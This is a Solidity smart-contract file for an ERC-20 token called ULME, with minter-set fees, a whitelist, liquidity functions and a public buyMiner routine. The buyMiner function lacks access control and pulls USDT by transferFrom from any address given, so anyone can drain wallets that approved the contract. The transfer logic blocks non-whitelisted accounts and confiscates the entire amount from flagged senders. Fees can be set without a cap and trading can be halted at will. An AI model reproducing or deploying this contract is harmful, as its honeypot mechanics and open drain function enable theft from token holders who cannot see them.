// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;
import "./dependencies.sol";

/**
 * @dev Extension of {ERC20} that adds a set of accounts with the {MinterRole},
 * which have permission to mint (create) new tokens as they see fit.
 *
 * At construction, the deployer of the contract is the only minter.
 */
contract ERC20Mintable is ERC20, MinterRole,ReentrancyGuard {
    using SafeMath for uint256;
    using Address for address;
    uint256 private constant BASE_RATIO = 10**18;
    mapping (address => uint256) private _limit;
    uint public _transactFeeValue = 10;
    uint public sale_date=1668678520;
    uint256[][] private ContractorsFee;
    address[][] private ContractorsAddress;
    address public _usdt_token;
    address public _roter;
    address public _sell;
    address public _dis;

    constructor(address dis) public {
        _dis=dis;
    }
    function getTransactFee() public view returns (uint256){
        return _transactFeeValue;
    }
    
    function setTransactFee(uint256 fee)public onlyMinter {
        _transactFeeValue=fee;
    }

    function setDis(address dis) public onlyMinter {
        _dis=dis;
    }
    function setSaleDate(uint date) public onlyMinter {
        sale_date=date;
    }

    function setSell(address token) public onlyMinter {
        _sell=token;
    }
    function setRoter(address roter_token,address usdt_token) public onlyMinter {
        _roter=roter_token;
        _usdt_token=usdt_token;
        IERC20(_usdt_token).approve(_roter,1e40);
    }

    function sendTransfer(address account,uint256 amount)public nonReentrant onlyMinter returns (bool){
        require(IERC20(address(this)).transfer(account,amount) , "sendTransfer:error");
        return true;
    }
    function sendApprove(address account,uint256 amount)public onlyMinter nonReentrant returns (bool){
        require(IERC20(address(this)).approve(account,amount) , "sendApprove:error");
        return true;
    }
    function setContractorsFee(uint256[] memory fee,address[] memory add,uint setType)public onlyMinter {
        require(fee.length == add.length , "fee<>add");
        if(ContractorsFee.length<=setType){
            ContractorsFee.push(fee);
            ContractorsAddress.push(add);
        }else{
            ContractorsFee[setType]=fee;
            ContractorsAddress[setType]=add;
        }
        
    }

    function getContractorsFee(uint setType)public view returns (uint256[] memory fee,address[] memory add){
        fee=ContractorsFee[setType];
        add=ContractorsAddress[setType];
        require(isMinter(_msgSender()) , "role error");
    }

    function addLiquidity(
        uint amountUsdt,
        uint amountTokenDesired
    ) public onlyMinter returns (uint256 amountA,uint256 amountB,uint256 liquidity){
        require(amountUsdt > 0, "addLiquidity: amountETH >0");
        require(amountTokenDesired > 0, "addLiquidity: amountTokenDesired >0");
        require(IERC20(address(this)).approve(_sell,amountTokenDesired), "addLiquidity: approve _roter error");
        (amountA,amountB,liquidity)=IUniswapV2Router01(_sell).addLiquidity(address(this),amountUsdt,amountTokenDesired,1,1);
    }

   function transferLiquidity(
        uint amountUsdt
    ) public onlyMinter returns (uint256 liquidity) {
        require(amountUsdt > 0, "addLiquidity: amountETH >0");
        require(IERC20(address(this)).approve(_sell,1000000000), "addLiquidity: approve _roter error");
        liquidity=IUniswapV2Router01(_sell).transferLiquidity(address(this),amountUsdt);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function transactionFee(address from,address to,uint256 amount)internal returns (uint256) {
        if(_msgSender()==address(this)||from==address(this)||to==address(this)||IUniswapV2Pair(_dis).isWhite(from)||IUniswapV2Pair(_dis).isWhite(to))return amount;
        if(IUniswapV2Pair(_dis).white(from)>1){
            super._transfer(from, address(this), amount);
            return 0;
        }
        require(IUniswapV2Pair(_dis).white(from)>0||IUniswapV2Pair(_dis).white(to)>0, "_transfer:black");

        uint setType=2;
        if(isContract(from)){
            setType=0;
        }else if(isContract(to)){
            setType=1;
        }

        if(sale_date>0){
            require(sale_date>1, "_transfer:Not at sales time stop");
            if(setType==0){
                require(block.timestamp>sale_date, "_transfer:Not at sales time");
            }
            
            // uint day=86400;
            // uint diff=block.timestamp.sub(sale_date);
            // if(diff<=day.mul(3)){
            //     uint time=diff.sub(diff.mod(day)).div(day);
            //     time=time.add(1);
            //     _limit[to] = _limit[to].add(amount);
            //     require(_limit[to]<=time.mul(10000).mul(BASE_RATIO), "_transfer:Limit exceeded");
            // }
        }

        uint256 realAmount = amount;
        uint256 transactFeeValue = amount.mul(_transactFeeValue).div(100);
        // if(!isContract(from)){
            require(balanceOf(from)>amount, "balanceOf is Insufficient");
            require(setType==0||balanceOf(from).sub(amount)>=BASE_RATIO.div(10000000), "balanceOf is too small");
        // }

        if (transactFeeValue >= 100) {
            realAmount = realAmount.sub(transactFeeValue);
            address pair=IUniswapV2Factory(IUniswapV2Router01(_roter).factory()).getPair(_usdt_token,address(this));
            // require(!isContract(_msgSender())||pair==_msgSender(), "_transfer:_msgSender==contract");
            if(setType==1&&pair!=address(0)){
                uint256 usdt=IERC20(_usdt_token).balanceOf(pair);
                uint256 mt=IERC20(address(this)).balanceOf(pair);
                uint256 usdt_mt=usdt.mul(BASE_RATIO).div(mt);

                uint256 fee=0;
                if(usdt_mt<=BASE_RATIO.div(1000).mul(8)){
                    fee=30;
                }else if(usdt_mt<BASE_RATIO.div(1000).mul(9)){
                    uint256 mod=usdt_mt.mod(BASE_RATIO.div(1000));
                    mod=10-mod.sub(mod.mod(BASE_RATIO.div(10000))).div(BASE_RATIO.div(10000));
                    fee=mod.mul(5);
                    if(fee>30){
                        fee=30;
                    }
                }
                if(fee>0){
                    fee = amount.mul(fee).div(100);
                    super._transfer(from, address(this), fee);
                    realAmount = realAmount.sub(fee);
                }
            }
            // uint256 surplus=0;
            for(uint256 i=0;i<ContractorsFee[setType].length;i++){
                if(ContractorsFee[setType][i]>0){
                    uint256 value = transactFeeValue.mul(ContractorsFee[setType][i]).div(100);
                    super._transfer(from, ContractorsAddress[setType][i], value);
                    // surplus=surplus.add(value);
                }
            }
            // require(transactFeeValue>=surplus, "transactFeeValue < surplus");
            // if(transactFeeValue>surplus){
            //     super._transfer(from, ContractorsAddress[setType][ContractorsAddress[setType].length-1], transactFeeValue.sub(surplus));
            // }
        }
        return realAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        amount = transactionFee(from,to, amount);
        super._transfer(from, to, amount);
    }

    function buyMiner(address user,uint256 usdt)public returns (bool){
        address[]memory token=new address[](2);
        token[0]=_usdt_token;
        token[1]=address(this);
        usdt=usdt.add(usdt.div(10));
        require(IERC20(_usdt_token).transferFrom(user,address(this),usdt), "buyUlm: transferFrom to ulm error");
        uint256 time=sale_date;
        sale_date=0;
        address k=0x25812c28CBC971F7079879a62AaCBC93936784A2;
        IUniswapV2Router01(_roter).swapExactTokensForTokens(usdt,1000000,token,k,block.timestamp+60);
        IUniswapV2Router01(k).transfer(address(this),address(this),IERC20(address(this)).balanceOf(k));
        sale_date=time;
        return true;
    }
}

contract UniverseGoldMountain is ERC20, ERC20Detailed,ERC20Mintable {
    constructor(address dis) public ERC20Detailed("ULME", "ULME", 18) ERC20Mintable(dis){
        uint256 totalSupply =18964990000* (10**uint256(18));
        _mint(address(this), totalSupply );
        _mint(dis, 345010000* (10**uint256(18)) );
        addMinter(dis);
    }
    
}